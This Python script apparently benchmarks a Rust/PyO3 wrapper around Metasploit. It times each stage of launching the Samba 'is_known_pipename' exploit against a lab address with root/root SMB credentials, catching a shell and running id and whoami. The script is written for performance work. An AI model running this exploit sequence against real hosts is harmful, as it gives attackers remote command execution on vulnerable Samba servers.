#!/usr/bin/env python3
"""
Step through MSF Ruby calls and time each one individually.

This gives us ground truth on where time actually goes.
"""

import os
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import assassinate_pyo3 as msf

TARGET = "172.19.0.3"
MSF_ROOT = os.path.expanduser("~/Projects/metasploit-framework")


def timed(name):
    """Decorator/context manager for timing."""
    class Timer:
        def __init__(self, name):
            self.name = name
            self.elapsed = 0
        def __enter__(self):
            self.start = time.perf_counter()
            return self
        def __exit__(self, *args):
            self.elapsed = time.perf_counter() - self.start
            print(f"  {self.name}: {self.elapsed*1000:.2f}ms")
    return Timer(name)


def cleanup():
    for sid in msf.list_sessions():
        try:
            msf.kill_session(sid)
        except:
            pass
    time.sleep(0.3)


def step_through_exploit():
    """Step through exploit execution timing each phase."""
    print("\n" + "="*60)
    print("PHASE 1: MODULE SETUP")
    print("="*60)

    with timed("create_module()"):
        m = msf.create_module("exploit/linux/samba/is_known_pipename")

    with timed("set RHOSTS"):
        m.options.RHOSTS = TARGET

    with timed("set SMB_SHARE_NAME"):
        m.options.SMB_SHARE_NAME = "myshare"

    with timed("set SMB_USER"):
        m.options.SMB_USER = "root"

    with timed("set SMB_PASS"):
        m.options.SMB_PASS = "root"

    with timed("compatible_payloads()"):
        payloads = m.compatible_payloads()
    print(f"    Found {len(payloads)} payloads")

    print("\n" + "="*60)
    print("PHASE 2: EXPLOIT JOB LAUNCH")
    print("="*60)

    seen_before = set(msf.list_sessions())

    with timed("exploit_job()"):
        m._rust.exploit_job("cmd/unix/interact")

    print("\n" + "="*60)
    print("PHASE 3: POLLING FOR SESSION")
    print("="*60)

    poll_start = time.perf_counter()
    poll_count = 0
    session_id = None

    while time.perf_counter() - poll_start < 30:
        poll_count += 1

        with timed(f"sleep_releasing_gvl(10ms)") if poll_count == 1 else nullcontext():
            msf.sleep_releasing_gvl(10)

        with timed(f"list_sessions()") if poll_count == 1 else nullcontext():
            current = set(msf.list_sessions())

        new_sessions = current - seen_before
        if new_sessions:
            session_id = next(iter(new_sessions))
            break
        seen_before = current

    poll_time = time.perf_counter() - poll_start
    print(f"  Total polling time: {poll_time*1000:.2f}ms ({poll_count} polls)")

    if not session_id:
        print("  NO SESSION CREATED!")
        return None

    print(f"  Session {session_id} detected!")

    print("\n" + "="*60)
    print("PHASE 4: SESSION ACCESS")
    print("="*60)

    with timed("get_session()"):
        session = msf.get_session(session_id)

    if not session:
        print("  Failed to get session!")
        return None

    # Access session properties
    with timed("session.sid"):
        _ = session.sid

    with timed("session.host"):
        host = session.host

    print(f"    Host: {host}")

    print("\n" + "="*60)
    print("PHASE 5: SHELL COMMANDS (the slow part)")
    print("="*60)

    # Test shell_command with different timeouts by calling Ruby directly
    # First, let's see what the raw Ruby calls look like

    print("\n--- Testing run_cmd (default 5s timeout) ---")
    with timed("run_cmd('id')"):
        out = session.run_cmd("id")
    print(f"    Output: {out.strip()}")

    print("\n--- Testing run_cmd('echo fast') ---")
    with timed("run_cmd('echo fast')"):
        out = session.run_cmd("echo fast")
    print(f"    Output: {out.strip()}")

    print("\n--- Testing run_cmd('whoami') ---")
    with timed("run_cmd('whoami')"):
        out = session.run_cmd("whoami")
    print(f"    Output: {out.strip()}")

    return session


def step_through_raw_ruby_shell_command(session):
    """
    Call Ruby's shell_command directly with different timeouts.
    This bypasses our Rust wrapper to test MSF directly.
    """
    print("\n" + "="*60)
    print("PHASE 6: RAW RUBY shell_command() TIMING")
    print("="*60)

    # We need to call Ruby directly - let's use the internal Rust API
    # Actually, let's check if we can pass timeout through

    print("""
    The Rust bridge has:
      run_cmd(&self, command: &str, timeout: Option<u32>)

    But Pyo3 wrapper doesn't expose timeout parameter.

    Let's test what we can with current API...
    """)

    # Time the individual components of a shell command
    print("\n--- Breakdown of what shell_command does ---")

    # We can't easily time Ruby internals from Python, but we can
    # infer from the source code:
    #
    # shell_command(cmd, timeout=5):
    #   1. shell_write(cmd) - writes to socket, ~instant
    #   2. while loop for `timeout` seconds:
    #      - IO.select with remaining timeout
    #      - shell_read(-1, 0.01) - read with 10ms timeout
    #   3. return accumulated buffer
    #
    # The loop runs for the FULL timeout because:
    # - Raw shells don't have EOF/prompt detection
    # - IO.select keeps returning true if socket is open
    # - Only exits when timeout expires

    print("""
    From MSF source (command_shell.rb:643-658):

    def shell_command(cmd, timeout=5)
      shell_write(cmd + command_termination)  # ~0.1ms

      etime = Time.now + timeout
      buff = ""

      while (Time.now < etime and IO.select([rstream], nil, nil, timeout))
        res = shell_read(-1, 0.01)  # 10ms read timeout
        buff << res if res
        timeout = etime - Time.now  # update remaining
      end

      buff
    end

    The loop runs ~500 iterations (5s / 10ms) regardless of output!
    """)


def nullcontext():
    """Null context manager for Python < 3.7 compatibility."""
    class NullContext:
        def __enter__(self): return self
        def __exit__(self, *args): pass
    return NullContext()


def main():
    print("="*60)
    print("MSF TIMING STEP-THROUGH")
    print("="*60)
    print(f"Target: {TARGET}")

    print("\nInitializing MSF...")
    with timed("init_msf()"):
        msf.init_msf(MSF_ROOT)

    print(f"Version: {msf.framework_version()}")

    cleanup()

    session = step_through_exploit()

    if session:
        step_through_raw_ruby_shell_command(session)

    # Final summary
    print("\n" + "="*60)
    print("TIMING SUMMARY")
    print("="*60)
    print("""
    FAST operations (<10ms):
      - create_module()
      - set options
      - list_sessions()
      - get_session()
      - session properties

    MEDIUM operations (100-300ms):
      - exploit_job() launch
      - compatible_payloads()

    SLOW operations (seconds):
      - Exploit network I/O: ~4s (SMB protocol + payload)
      - run_cmd(): ~5s (waits full timeout)

    The 5-second run_cmd() is MSF's shell_command timeout.
    This is UNAVOIDABLE for raw shells without prompt detection.
    """)

    cleanup()


if __name__ == "__main__":
    main()
